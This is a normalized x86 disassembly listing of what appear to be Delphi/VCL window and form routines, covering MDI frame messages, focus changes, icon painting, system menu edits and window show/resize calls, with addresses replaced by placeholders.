mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_458e08
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_4419ec
push 0x0
mov eax ebx
call sub_4445f8
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_458e4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_442170
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_4445f8
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4445f8
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_458eb0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_458f58
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458f5f
lea eax [ ebp - 0x4 ]
call sub_404074
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax edi
call sub_455244
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_40349c
mov eax ebx
call sub_459268
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_40349c
test al al
jne r-xdata
sub_458f68
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_4410d4
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_4410d4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_458eb0
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_458fb0
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_458eb0
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_458fd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_413f80
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_413e60
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_413f80
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_413e60
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_459244
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4445f8
mov dx 0xb000
call sub_455004
test al al
jne r-xdata
call sub_4445f8
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_455004
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45924b
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403ad8
jmp r-xdata
call sub_403ad8
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4410d4
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_4445f8
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_455004
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43efc4
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
call sub_403ad8
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_4445f8
mov dx 0xb01a
call sub_455004
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403ad8
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43efc4
sub_459268
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_43efc4
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_4445f8
push eax
call SetFocus
mov eax ebx
call sub_4445f8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_4592b8
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_43efc4
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45936c
mov eax esi
call sub_459268
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_444a20
mov edx eax
mov eax esi
call sub_458eb0
sub_45931c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_457f34
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_43efc4
mov eax ebx
call sub_457f34
mov edx esi
call sub_45931c
sub_45936c
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_4521d4
mov edx esi
call sub_4521b8
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_459414
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
sub_459460
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_459414
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_459490
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_459414
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_4594fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41e074
xor eax eax
push ebp
push sub_4595aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41e564
xor eax eax
push ebp
push sub_459587
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_40349c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45958e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41e564
retn
sub_4595b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_457f34
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_457f68
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_40349c
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_4438c0
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_457fb4
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_40349c
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_459658
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4445f8
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4445f8
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_4594e0
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4445f8
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_442788
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_4596d6
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41dc20
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_459738
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4445f8
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_442a4c
pop edi
pop esi
retn
sub_459784
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_459880
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_4582a8
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_459784
pop ecx
sub_4598b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43f4e0
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4445f8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4445f8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4445f8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_43e4b8
pop esi
pop ebx
retn
sub_459944
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44384c
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_4445f8
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_451bf4
sub_4599a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4428e8
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_451608
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_4599f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_451e68
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_459a28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_459ac3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459aca
lea eax [ ebp - 0x4 ]
call sub_404074
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_451568
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e7e4
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43af08
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45e7e4
jmp r-xdata
sub_459af0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_40349c
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_459b30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cb6c
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_459b5c
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_45931c
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43ace0
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_459bb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_443730
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45d198
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_40349c
sub_459c40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4445f8
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4445f8
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4445f8
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_459cd8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4445f8
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_4592b8
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_40349c
sub_459d30
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_444b2c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_459d5c
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_45931c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_459d78
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_451598
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_451598
sub_459db8
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_459df0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_4040c8
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_459e24
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_459f75
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459f7c
lea eax [ ebp - 0x10 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_459d78
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43ac84
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412988
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43d910
lea eax [ ebp - 0x1c ]
call sub_406b20
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_459d78
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_459db8
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_45e488
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_45e4f0
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_45e4f0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_459df0
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412988
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_43d910
lea eax [ ebp - 0x1c ]
call sub_406b20
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_45e420
test [ esi + 0x228 ] 0x8
je r-xdata
sub_459f84
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_459ff8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
